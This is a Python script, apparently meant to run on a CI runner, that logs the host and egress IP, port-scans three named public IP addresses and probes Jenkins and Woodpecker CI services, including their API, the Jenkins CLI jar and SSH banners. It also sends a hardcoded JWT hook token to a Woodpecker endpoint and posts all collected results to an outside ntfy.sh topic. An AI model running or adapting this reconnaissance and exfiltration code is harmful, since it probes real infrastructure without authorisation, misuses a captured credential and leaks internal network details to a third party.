import os,socket,ssl,json,time,urllib.request,urllib.error,sys,random,string
TOPIC=os.environ.get("TOPIC","i50455reach-def")
CTX=ssl._create_unverified_context()
OUT=[]
def log(*a):
    line=" ".join(str(x) for x in a); print(line,flush=True); OUT.append(line)
def send(tag,text):
    text=str(text)
    for i in range(0,len(text),2800):
        body=("[%s %d/%d] "%(tag,i//2800+1,(len(text)-1)//2800+1)).encode()+text[i:i+2800].encode("utf-8","replace")
        for _ in range(3):
            try:
                urllib.request.urlopen(urllib.request.Request("https://ntfy.sh/"+TOPIC,data=body,method="POST"),timeout=15,context=CTX).read();break
            except Exception: time.sleep(1)
def negctl(): return "negctl_"+''.join(random.choice(string.ascii_letters+string.digits) for _ in range(12))
def tcp(host,port,t=8):
    t0=time.time()
    try:
        s=socket.create_connection((host,port),timeout=t); s.close(); return True,round((time.time()-t0)*1000)
    except Exception as e: return False,type(e).__name__+":"+str(e)[:50]
def http(host,port,path="/",method="GET",headers=None,body=None,timeout=12):
    hdr={"User-Agent":"curl/8.5.0","Connection":"close"}
    if headers: hdr.update(headers)
    data=body.encode() if isinstance(body,str) else body
    try:
        req=urllib.request.Request("http://%s:%s%s"%(host,port,path),data=data,headers=hdr,method=method)
        r=urllib.request.urlopen(req,timeout=timeout,context=CTX)
        return r.status,dict(r.headers),r.read(4000)
    except urllib.error.HTTPError as e:
        try:b=e.read(2000)
        except Exception:b=b""
        return e.code,dict(e.headers),b
    except Exception as e:
        return None,{} ,("ERR:"+str(e)[:100]).encode()
def banner(host,port,t=10):
    try:
        s=socket.create_connection((host,port),timeout=t); s.settimeout(6)
        try: b=s.recv(200)
        except Exception: b=b""
        s.close(); return b.decode("latin1","replace").strip()[:150]
    except Exception as e: return "ERR:"+str(e)[:80]

def main():
    log("RUNNER",socket.gethostname(),time.strftime("%Y-%m-%dT%H:%M:%SZ",time.gmtime()))
    try: log("EGRESS",urllib.request.urlopen("https://api.ipify.org",timeout=12,context=CTX).read().decode().strip())
    except Exception as e: log("EGRESS_FAIL",type(e).__name__)
    # controls
    for h,p in [("1.1.1.1",443),("github.com",22),("8.8.8.8",53)]:
        ok,info=tcp(h,p); log("CTRL",h,p,"OPEN" if ok else "NO",info)
    MATRIX={
      "51.222.15.95":[21,22,80,443,3001,8080,90,17000,35796,39777],
      "51.210.13.182":[22,80,443,8000],
      "51.161.35.209":[22,80,443,3306],
    }
    reach={}
    for h,ports in MATRIX.items():
        log("--- TARGET",h,"---")
        for p in ports:
            ok,info=tcp(h,p); reach[(h,p)]=ok
            log("PORT",h,p,"OPEN:%s"%info if ok else "NO(%s)"%info)
    # Jenkins deeper
    if reach.get(("51.222.15.95",8080)):
        st,hd,b=http("51.222.15.95",8080,"/")
        log("JK_ROOT st=",st,"Server=",hd.get("Server",""),"X-Jenkins=",hd.get("X-Jenkins",""),"Loc=",hd.get("Location",""))
        st,hd,b=http("51.222.15.95",8080,"/api/json")
        log("JK_API st=",st,"body=",(b or b"")[:150].decode("utf-8","replace"))
        st,hd,b=http("51.222.15.95",8080,"/jnlpJars/jenkins-cli.jar",method="HEAD")
        log("JK_CLIJAR st=",st,"len=",hd.get("Content-Length",""))
    if reach.get(("51.222.15.95",22)):
        log("JK_SSH_BANNER",banner("51.222.15.95",22))
    # Woodpecker deeper
    if reach.get(("51.210.13.182",8000)):
        for path in ["/","/version","/api/version","/api/user","/healthz"]:
            st,hd,b=http("51.210.13.182",8000,path)
            log("WP %s"%path,"st=",st,"Server=",hd.get("Server",""),"body=",(b or b"")[:120].decode("utf-8","replace"))
        tok="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmb3JnZS1pZCI6IjEiLCJyZXBvLWZvcmdlLXJlbW90ZS1pZCI6IjExMDczMTg4NDEiLCJ0eXBlIjoiaG9vayJ9.LSpLgwWDhXQUC9omPz08j5cLFXjD8jF32GFscAK7kO8"
        st,hd,b=http("51.210.13.182",8000,"/api/hook?access_token="+tok)
        log("WP_HOOK_GET st=",st,"body=",(b or b"")[:150].decode("utf-8","replace"))
    if reach.get(("51.161.35.209",22)):
        log("D209_SSH_BANNER",banner("51.161.35.209",22))
    if reach.get(("51.161.35.209",80)):
        st,hd,b=http("51.161.35.209",80,"/")
        log("D209_80 st=",st,"Server=",hd.get("Server",""),"Loc=",hd.get("Location",""))
    send("REACH","\n".join(OUT)); log("DONE")
main()
